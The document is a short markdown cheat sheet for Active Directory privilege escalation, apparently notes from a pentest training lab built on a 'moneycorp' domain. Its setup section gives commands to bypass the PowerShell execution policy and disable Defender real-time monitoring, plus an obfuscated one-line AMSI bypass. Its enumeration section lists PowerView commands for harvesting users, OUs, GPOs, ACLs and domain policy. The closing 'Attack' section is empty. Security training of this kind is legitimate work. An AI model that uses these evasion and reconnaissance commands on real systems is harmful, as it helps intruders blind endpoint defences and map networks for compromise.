# Privilege Escalation

## Active Directory

### Setup

Bypass Execution Policy
```powershell
powershell -ep bypass
```

Turn off AMSI 
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
```

AMSI bypass
```powershell
S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```


### Enumeration

#### PowerView

Get all the users
```powershell
Get-NetUser
Get-NetUser | select -ExpandProperty samaccountname
Get-NetUser -Credential $Cred | Format-Table name, samaccountname, userprincipalname, description
Get-NetUser -Username student1
Get-UserProperty -Properties pwdlastset
Find-UserField -SearchField Description -SearchTerm "built"
```

Get OU
```powershell
Get-NetOU
Get-NetOU StudentMachines | %{Get-NetComputer -ADSPath $_}
```

Get GPO
```powershell
Get-NetGPO
(Get-NetOU StudentMachines -FullData).gplink
Get-NetGPO -ADSpath 'LDAP://cn={3E04167E-C2B6-4A9A-8FB7-C811158DC97C},cn=policies,cn=system,DC=dollarcorp,DC=moneycorp,DC=local'
Get-NetGPO -GPOName "{3E04167E-C2B6-4A9A-8FB7-C811158DC97C}"
Get-GPO -Guid [objectguid]
Find-GPOComputerAdmin - Computername dcorp-student1.dollarcorp.moneycorp.local
Find-GPOLocation -UserName student1 -Verbose
```

Get ACLs
```powershell
Get-ObjectAcl -SamAccountName "users" -ResolveGUIDs -Verbose
Get-ObjectAcl -SamAccountName "users" -ResolveGUIDs | Format-Table IdentityReference,ActiveDirectoryRights,AccessControlType
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match "student"}
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match "RDPUsers"}
```

Get Domain Data
```powershell
Get-NetDomain
Get-NetDomain -Domain moneycorp.local
Get-DomainSID
Get-DomainPolicy
(Get-DomainPolicy)."system access"
(Get-DomainPolicy -domain moneycorp.local)."system access"
Get-NetDomainController -Domain moneycorp.local
```

### Attack
